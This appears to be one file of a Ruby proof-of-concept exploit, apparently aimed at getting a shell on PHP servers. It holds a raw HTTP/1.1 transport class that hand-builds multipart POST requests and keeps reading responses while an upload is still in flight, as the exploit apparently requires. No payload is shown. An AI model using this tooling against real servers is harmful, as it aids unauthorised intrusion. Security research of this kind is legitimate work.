# frozen_string_literal: true

require "socket"
require "openssl"
require "timeout"

module PHP2ShellPOC2026
  module Poc
    # Raw HTTP/1.1 transport for the proof-of-concept. It deliberately does
    # not use HttpClient: the exploit depends on the exact request line,
    # header order, multipart body and read-while-upload behaviour, and
    # Net::HTTP normalises all of those.
    class Transport
      READ_CHUNK = 65_536
      CONNECT_ATTEMPTS = 10
      CONNECT_PAUSE = 0.3

      attr_reader :target

      def initialize(target, verify_tls: true, ca_file: nil, timeout: 30.0)
        @target = target
        @host = target.ascii_host
        @port = target.port
        @secure = target.scheme == "https"
        @path = target.uri.path.to_s.empty? ? "/" : target.uri.path
        @verify_tls = verify_tls
        @ca_file = ca_file
        @timeout = timeout.to_f
      end

      def post(body, boundary, read_limit: 1 << 20, timeout: nil, headers: {})
        extra = headers.map { |name, value| "#{name}: #{value}\r\n" }.join
        request = (
          "POST #{@path} HTTP/1.1\r\n" \
          "Host: #{host_header}\r\n" \
          "#{extra}" \
          "Content-Type: multipart/form-data; boundary=#{boundary}\r\n" \
          "Content-Length: #{body.bytesize}\r\n" \
          "Connection: close\r\n" \
          "\r\n"
        ).b

        exchange(request, body, read_limit: read_limit, timeout: timeout)
      end

      def get(path, read_limit: 1 << 20, timeout: nil)
        request = (
          "GET #{path} HTTP/1.1\r\n" \
          "Host: #{host_header}\r\n" \
          "Connection: close\r\n" \
          "\r\n"
        ).b

        raw = exchange(request, nil, read_limit: read_limit, timeout: timeout)
        head, _, body = raw.partition("\r\n\r\n")
        status = head[/\AHTTP\/1\.[01] (\d{3})/n, 1].to_i
        [status, body]
      end

      private

      def exchange(request, body, read_limit:, timeout:)
        read_timeout = (timeout || @timeout).to_f
        socket = connect
        buffer = +"".b
        mutex = Mutex.new
        reader = Thread.new do
          loop do
            break if mutex.synchronize { buffer.bytesize } >= read_limit

            chunk = read_chunk(socket, read_timeout)
            break if chunk.nil?

            mutex.synchronize { buffer << chunk }
          end
        rescue StandardError
          nil
        end

        begin
          write_all(socket, request, read_timeout)
          write_all(socket, body, read_timeout) if body
        rescue StandardError
          # The worker may abort while the upload is still in flight. The
          # response already buffered by the reader is still useful.
          nil
        ensure
          reader.join(read_timeout + 1.0)
          close(socket)
          reader.join(0.5)
        end

        mutex.synchronize { buffer.byteslice(0, read_limit) || "".b }
      end

      def connect
        last_error = nil
        CONNECT_ATTEMPTS.times do
          socket = nil
          begin
            socket = Socket.tcp(@host, @port, connect_timeout: @timeout)
            socket = secure_socket(socket) if @secure
            begin
              socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
            rescue StandardError
              nil
            end
            return socket
          rescue StandardError => e
            last_error = e
            close(socket)
            sleep CONNECT_PAUSE
          end
        end
        raise Error, "connection failed: #{last_error.class}: #{last_error.message}"
      end

      def secure_socket(socket)
        context = OpenSSL::SSL::SSLContext.new
        if @verify_tls
          context.set_params(verify_mode: OpenSSL::SSL::VERIFY_PEER)
          context.ca_file = @ca_file if @ca_file
        else
          context.verify_mode = OpenSSL::SSL::VERIFY_NONE
        end

        ssl = OpenSSL::SSL::SSLSocket.new(socket, context)
        ssl.hostname = @host if ssl.respond_to?(:hostname=)
        ssl.sync_close = true
        Timeout.timeout(@timeout) { ssl.connect }
        ssl.post_connection_check(@host) if @verify_tls
        ssl
      end

      def read_chunk(socket, timeout)
        Timeout.timeout(timeout) { socket.readpartial(READ_CHUNK) }
      rescue EOFError, Timeout::Error, IOError, SystemCallError, OpenSSL::SSL::SSLError
        nil
      end

      def write_all(socket, data, timeout)
        offset = 0
        Timeout.timeout(timeout) do
          while offset < data.bytesize
            offset += socket.write(data.byteslice(offset, READ_CHUNK * 4))
          end
        end
      end

      def close(socket)
        socket&.close
      rescue StandardError
        nil
      end

      def host_header
        host = @host.to_s.include?(":") && !@host.to_s.start_with?("[") ? "[#{@host}]" : @host
        "#{host}:#{@port}"
      end
    end
  end
end
